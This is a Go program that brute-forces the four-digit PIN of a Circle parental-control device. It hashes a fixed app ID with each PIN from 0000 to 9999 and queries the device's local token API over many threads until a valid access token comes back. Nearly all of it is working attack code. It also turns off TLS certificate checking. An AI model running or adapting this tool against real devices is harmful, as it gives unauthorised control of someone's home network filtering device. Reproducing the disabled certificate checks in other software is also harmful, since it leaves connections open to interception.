package main

import (
	"crypto/sha1"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"sync"
	"time"
)

type CircleSession struct {
	Client    http.Client
	IpAddress string
	StartTime time.Time
	Wg        sync.WaitGroup
}

const APPID = "HackMyCircleDevice99" // min length: 20

func (session *CircleSession) findCircleToken(start int, stop int) {
	fmt.Printf("Searching: start:%v, end:%v\n", start, stop)
	defer session.Wg.Done()
	for x := start; x <= stop; x++ {
		pincode := fmt.Sprintf("%04d", x)
		// show some progress
		if (x % 10) == 0 {
			fmt.Printf("PINCODE: %v\n", pincode)
		}
		h := sha1.New()
		h.Write([]byte(APPID + pincode))
		hash := fmt.Sprintf("%x", h.Sum(nil))
		//		fmt.Println(hash)

		startTime := time.Now()

		res, err := session.Client.Get("https://" + session.IpAddress + ":4567/api/TOKEN?appid=" + APPID + "&hash=" + hash)
		if err != nil {
			fmt.Println(err.Error())
			os.Exit(1)
		}
		if (x % 10) == 0 {
			fmt.Printf("Get(): time elapsed: %v\n", time.Since(startTime))
		}
		body, err := ioutil.ReadAll(res.Body)
		if err != nil {
			fmt.Println(err.Error())
			os.Exit(2)
		}
		res.Body.Close()
		data := map[string]interface{}{}
		json.Unmarshal(body, &data)
		//fmt.Println(data)
		if data["result"] == "success" {
			fmt.Printf("APPID  : %v\nPINCODE: %v\nTOKEN  : %v\nElapsed Time: %v s\n", APPID, pincode, data["token"], time.Since(session.StartTime).Seconds())
			break
		} else {
			if data["error"] == "token request failure - invalid app id" {
				fmt.Println("Invalid APPID" + APPID)
				os.Exit(3)
			}
		}
	}
}

func main() {
	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, "usage: %v: [-t n] <circle-ip-address>\n", os.Args[0])
		flag.PrintDefaults()
	}
	threadsPtr := flag.Int("t", 4, "Number Of threads to use")
	flag.Parse()

	if flag.NArg() != 1 {
		flag.Usage()
		os.Exit(1)
	}
	ipAddress := flag.Arg(0)
	fmt.Printf("using ip address: %v\n", ipAddress)

	// NOTE: the following line doesn't work because the Circle device
	// doesn't have a certificate.  so, use an insecure connection instead
	//		res, err := http.Get("https://" + ipAddress + ":4567/api/TOKEN?appid=" + APPID + "&hash=" + hash)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	session := &CircleSession{Client: http.Client{Transport: tr}, IpAddress: ipAddress, StartTime: time.Now()}
	threads := *threadsPtr
	fmt.Printf("Using %v Threads\n", threads)
	groupSize := int(10000 / threads)
	// yes I know all all number of threads divide evenly into 1000 :-)
	for x := 0; x < threads; x++ {
		session.Wg.Add(1)
		start := groupSize * x
		end := (groupSize * (x + 1)) - 1
		go session.findCircleToken(start, end)
	}
	session.Wg.Wait()
	os.Exit(0)
}
